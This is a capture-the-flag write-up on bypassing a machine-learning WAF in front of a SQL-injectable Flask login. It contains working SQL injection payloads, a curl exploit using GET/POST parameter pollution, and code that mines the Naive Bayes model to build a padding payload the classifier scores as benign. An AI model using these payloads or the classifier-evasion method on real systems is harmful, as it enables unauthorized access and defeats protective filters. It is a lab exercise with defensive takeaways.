---
title: "ACS — AI WAF Bypass (web) writeup"
published: 2026-11-05
description: "An ML guard that scores the wrong parameters, then gets beaten with its own training data: offline model probing, digit-shaped gaps, a GET/POST parser mismatch, and a Naive Bayes log-likelihood dilution attack that outvotes the malicious n-grams with people's names."
tags: [web, hackthebox, sqli, machine-learning, waf-bypass]
category: CTF
draft: false
---

A login page guarded by a machine-learning WAF, sitting on top of the most textbook SQL
injection you'll ever see. The catch: the model is genuinely good at its job — every classic
bypass I threw at it got blocked, and it took two completely different breaks to get through.
The first wasn't through the model at all: the WAF and the app disagree about *which copy of a
parameter* they're reading, so the "AI" never even sees the payload. The second *is* through
the model — Naive Bayes adds up evidence per n-gram, and if you know which tokens its training
data considers maximally innocent, you can drown the malicious signal under a crowd of
witnesses. Both work; the post covers each.

## Setup

Two containers: the Flask app and a MariaDB. First boot fails with `Connection refused` —
`depends_on` only waits for the container to *start*, not for MariaDB to actually listen, and
`init_db()` runs before the Flask routes. One restart fixes it, since the DB is up by then:

```bash
docker compose up -d        # ai-waf exits(1): raced the DB
docker start ai-waf         # DB is ready now -> app comes up on :10003
```

## Reading the source

The WAF is a `before_request` hook that scores **every** parameter with a pickled scikit-learn
model and 403s on a malicious prediction:

```python
@app.before_request
def ai_waf():
    all_params = request.values.to_dict()
    for key, value in all_params.items():
        X_tfidf = vectorizer.transform([value])
        pred = clf.predict(X_tfidf)
        if pred[0] == 1:
            abort(403, description="Blocked by AI-WAF")
```

And behind it, the login query is string concatenation from 2005:

```python
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
```

Login as `admin` returns the flag from the `FLAG` env var. So the whole challenge is: get one
SQLi payload past the model. The compose file ships the DB creds and a `FLAG=ACS{...}` line —
redacted here, obviously.

## Probing the model offline

The challenge ships `ai_waf_model.pkl` and `tfidf_vectorizer.pkl`. That's a gift: I can score
candidate payloads against the *exact* model before touching the server. The pickles store the
tokenizer by reference, so any probe script has to define the same function in `__main__`:

```python
import re, joblib

def custom_tokenizer(text):  # must exist under this exact name — the pickle references it
    return re.findall(r"[A-Za-z0-9_]+|[^\sA-Za-z0-9_]", text)

clf = joblib.load("ai_waf_model.pkl")
vec = joblib.load("tfidf_vectorizer.pkl")
print(clf.predict(vec.transform(["1' OR '1'='1"]))[0])   # 1 = blocked
```

(Hat tip to the app itself: it only works because `custom_tokenizer` lives in `app.py`, which
is `__main__` when you run `python app.py`.)

The results were humbling. The model — `MultinomialNB` over a `CountVectorizer` with 1–3 grams
trained on the SQLiV5 corpus plus benign traffic — blocks essentially everything classic:

| payload | verdict |
|---------|---------|
| `1' OR '1'='1` (any case) | BLOCK |
| `admin'-- -` / `admin'#` / `admin'--` | BLOCK |
| `'||'` / `admin'||'` | BLOCK |
| `x' UNION SELECT 1,2,3-- -` | BLOCK |
| `admin\` (backslash) | **PASS** |
| `||1` | BLOCK |
| `||true` / `||0x31` / `||1e0` | **PASS** |

Two observations worth keeping. First, case doesn't help — the tokenizer is case-sensitive, so
`OR`/`or`/`oR` are separate features and the training data covered all of them. Second, the
model's gaps are digit-shaped: `||1` is blocked but `||true`, `||0x1`, `||1e0` sail through.
The n-grams around *digits adjacent to operators* carry the malicious signal; `true` as a
keyword apparently doesn't.

## Why the pure model bypass stalls

The backslash trick looked promising: `username = admin\` makes MySQL treat the template's
closing quote as escaped, so the string literal swallows ` AND password = ` whole, and the
password field becomes free-form SQL. Pairs beautifully with `||true`…

…except the template appends one more quote after the password field. The rendered query ends
`|| true '` — an unterminated string, error 1064. You need to neutralize that quote, and every
neutralizer fails somewhere:

- `#`, `-- `, `/*` → **all comments are hard-blocked**, in any position, in any context
- closing it yourself (`||true||'`) → the `||`+quote n-gram is exactly what the model weights hardest
- a trailing `\` to escape it → a bare backslash outside a string is invalid MySQL
- MySQL string-introducer prefixes (`x''`, `n''`, `b''`) → they need their *opening* quote in
  the payload, which lands you right back in blocked territory

I validated every candidate twice — against the model, *and* against the live MariaDB by
rendering the exact final query — because a WAF-clean payload that 500s is worth nothing. That
joint filter is what told me this path was a dead end instead of letting me grind it forever.

## The actual break: the WAF reads different parameters than the app

Stuck, I re-read the WAF hook. It scores `request.values.to_dict()`, the app reads
`request.form[...]`. Those are two different parsers, and in werkzeug they disagree about
duplicate keys. `request.values` is `CombinedMultiDict([args, form])` — query string first —
and `to_dict()` keeps the **first** occurrence per key:

```python
from importlib.metadata import version
from werkzeug.datastructures import CombinedMultiDict, MultiDict
print(version("werkzeug"))  # 3.1.9

args = MultiDict([("username", "GETVAL"), ("password", "GETVAL")])
form = MultiDict([("username", "POSTVAL"), ("password", "POSTVAL")])
c = CombinedMultiDict([args, form])
print(c.to_dict())   # {'username': 'GETVAL', 'password': 'GETVAL'}
```

So: **the WAF scores the GET copies, the SQL query uses the POST copies.** Send both, let them
disagree. The model never sees anything but `hello` and `world`.

One more MySQL footnote: `admin'--` 500s, because MySQL only treats `--` as a comment when it's
followed by whitespace — bare `--'` parses as double negation. `#` has no such requirement.

## Exploit

```bash
curl -s -X POST "http://localhost:10003/?username=hello&password=world" \
  --data-urlencode "username=admin'#" \
  --data-urlencode "password=anything"
```

Rendered query: `SELECT * FROM users WHERE username = 'admin'#' AND password = 'anything'` —
the comment eats the rest, the WHERE clause reduces to `username = 'admin'`, and the app
prints:

```
Login successful! Welcome back, admin. Here is your flag: ACS{████████████████████████████████████}
```

*(flag redacted — no freebies, go earn it)*

## Round two: beating the model with its own training data

The HPP split is a parser bug, and it felt like a dodge — I wanted a payload the *model itself*
scores as benign. Going back to the arithmetic: MultinomialNB decides by
`class prior + Σ log P(n-gram | class)`. Three facts fell out of the pickles:

- Training was **87% benign** (12,186 vs 1,882 samples), so an input matching *zero* vocabulary
  n-grams defaults to benign with a +1.87 log-margin. Empty string, emoji, garbage — all pass.
- The single quote `'` is itself one of the most malicious-weighted unigrams (−5.03). Every
  injection geometry *must* contain quotes, so there's a fixed penalty you can't engineer away.
- The penalty is **fixed**, but the benign side of the scale is open-ended: any token the
  training data loves adds +1.18 of innocent evidence, as many times as you like.

So: dilution. If the payload core costs about −6, stack enough maximally-benign tokens after it
and the sum tips positive — while MySQL reads the padding as harmless string content.

My first attempt made things *worse*: padding with `user login password account` drove the
margin from −6 to −112. Of course it did — SQLi payloads are full of
`select username, password from users`, so login-vocabulary leans **malicious** in this corpus.
The right padding isn't guessable, it's minable:

```python
import numpy as np
margin = clf.feature_log_prob_[0] - clf.feature_log_prob_[1]   # benign minus malicious
inv = {v: k for k, v in vec.vocabulary_.items()}
best = sorted(range(len(margin)), key=lambda i: margin[i])[-15:]
pad = " ".join(inv[i] for i in best)
```

The winners are people's names — `sherry`, `john`, `jimmy`, `petunia`, `jester`, `otter`,
`lilly`... the benign half of the training set is ordinary logins, and ordinary logins are full
of ordinary names. Five repetitions of fifteen names push the margin to **+82.5** and the model
waves the payload through:

```python
username = "admin\\"                        # backslash: string 1 swallows " AND password = "
password = "||true-'" + pad * 5             # ... || true-'<pad>'  ->  FALSE || (1-0) -> TRUE
```

Rendered: `WHERE username = '<swallowed>' || true-'<pad>'` — the padding string coerces to 0,
`true − 0` is 1, the OR makes the clause true for every row, `fetchone()` returns admin, flag.
Verified against the live app with no HPP at all: **HTTP 200, logged in as admin**.

### The WAF's other blind spots (no sink here, but keep them in mind)

- Parameter **keys** are never checked — the hook iterates `for key, value in ...items()` and
  scores only values.
- **Headers and cookies** are never scored; `request.values` is query-string + form only.
- Multipart **file fields** don't appear in `request.values` either.
- The app ships with `debug=True` — if `vectorizer.transform` ever throws on a crafted value,
  that's an unhandled exception in a `before_request` hook, i.e. the interactive Werkzeug
  debugger. PIN-gated, but it's a real escalation path on a box where you can read `/proc`.

## Takeaways

- **A WAF is only as good as its field of view.** The model blocked everything, but bypass one
  pointed it at the wrong copy of the data; any time input is parsed twice (proxy vs app,
  `values` vs `form`, sanitizer vs template), the two views are attack surface.
- **Linear classifiers take orders from the sum.** Naive Bayes/SVM-style WAFs don't have an
  "injection detector" — they have a ledger. A fixed malicious penalty can be outvoted by bulk
  innocent evidence, and the model itself will tell you exactly which tokens it considers
  innocent.
- **Padding vocabulary is a trap.** Words from the *domain* you're attacking (user, login,
  password) are exactly what the malicious training samples contain. Mine
  `feature_log_prob_` instead of guessing — here the innocent words were people's names.
- **Ship the model, lose the mystique.** Handing out the `.pkl` files turned "AI WAF" into a
  local, deterministic oracle. Every finding above was verified offline before a single request
  hit the server.
- **Validate payloads against both layers at once.** WAF verdict + rendered-SQL execution
  against a real DB is the only honest test; either one alone lies to you.
- **MySQL trivia is load-bearing**: `--` needs a trailing space, `\` is illegal outside
  strings, and comments aren't the only way to close a quote — they're just the only way that
  this model doesn't watch.

If you're defending an app like this: parameterize the query (the WAF is a speed bump, not a
fix), and when you inspect input, inspect *exactly* what your query builder will consume — same
source, same dedup rules.
